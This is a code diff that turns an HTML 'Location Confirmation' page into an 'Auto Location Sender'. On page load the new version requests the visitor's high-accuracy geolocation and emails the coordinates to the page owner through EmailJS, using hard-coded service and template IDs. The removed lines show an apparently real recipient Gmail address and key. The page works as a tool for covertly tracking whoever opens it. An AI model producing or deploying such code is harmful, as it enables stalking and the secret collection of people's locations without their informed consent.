@@ -3,97 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Confirmation</title>
+    <title>Auto Location Sender</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             padding: 20px;
-            background-color: #f0f0f0;
+            background-color: #f4f4f4;
         }
-        button {
-            padding: 15px 30px;
+        #status {
             font-size: 18px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        #result {
             margin-top: 20px;
-            font-size: 16px;
+            color: #333;
         }
     </style>
 </head>
 <body>
-    <h1>Confirm Your Location</h1>
-    <p>To proceed, press the button below to share your location.</p>
-    <button onclick="getLocation()">Confirm Location</button>
-    <p id="result"></p>
+    <h1>Tracking Location...</h1>
+    <p id="status">Waiting for location...</p>
 
-    <!-- Add EmailJS SDK -->
-    <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
+    <!-- 📌 EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
     <script>
-        // Initialize EmailJS with your Public Key
-        (function(){
-            emailjs.init("BlJiNbBptTiCjJ_qj"); // Replace with your EmailJS Public Key (e.g., user_123456789)
+        (function() {
+            emailjs.init("YOUR_PUBLIC_KEY"); // 🔹 Replace with your EmailJS Public Key
         })();
 
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
-            } else {
-                document.getElementById("result").innerHTML = "Your browser doesn't support geolocation.";
-            }
-        }
-
-        function sendPosition(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const result = `Location: Latitude ${latitude}, Longitude ${longitude}`;
-            document.getElementById("result").innerHTML = result;
-
-            // Send email using EmailJS
+        function sendLocation(latitude, longitude) {
             const params = {
                 latitude: latitude,
                 longitude: longitude,
-                time: new Date().toLocaleString(),
-                to_email: "misofiko3@gmail.com" // Replace with your email (e.g., your-email@gmail.com)
+                time: new Date().toLocaleString()
             };
 
             emailjs.send("service_p3gxlas", "template_tifp0tj", params)
-                .then(function(response) {
-                    console.log("Email sent successfully!", response);
-                    document.getElementById("result").innerHTML += "<br>Email sent to your inbox!";
-                }, function(error) {
-                    console.log("Failed to send email:", error);
-                    document.getElementById("result").innerHTML += "<br>Failed to send email.";
+                .then(response => {
+                    console.log("✅ Email sent successfully!", response);
+                    document.getElementById("status").innerText = "📩 Location sent successfully!";
+                })
+                .catch(error => {
+                    console.error("❌ Failed to send email:", error);
+                    document.getElementById("status").innerText = "❌ Failed to send location.";
                 });
         }
 
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("result").innerHTML = "Permission to access location was denied.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("result").innerHTML = "Location information is unavailable.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("result").innerHTML = "The request to get location timed out.";
-                    break;
-                default:
-                    document.getElementById("result").innerHTML = "An unknown error occurred.";
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    sendLocation(position.coords.latitude, position.coords.longitude);
+                }, error => {
+                    document.getElementById("status").innerText = "❌ Error getting location.";
+                }, { enableHighAccuracy: true });
+            } else {
+                document.getElementById("status").innerText = "❌ Geolocation is not supported.";
             }
         }
+
+        // ✅ Automatically fetch and send location on page load
+        window.onload = getLocation;
     </script>
 </body>
 </html>
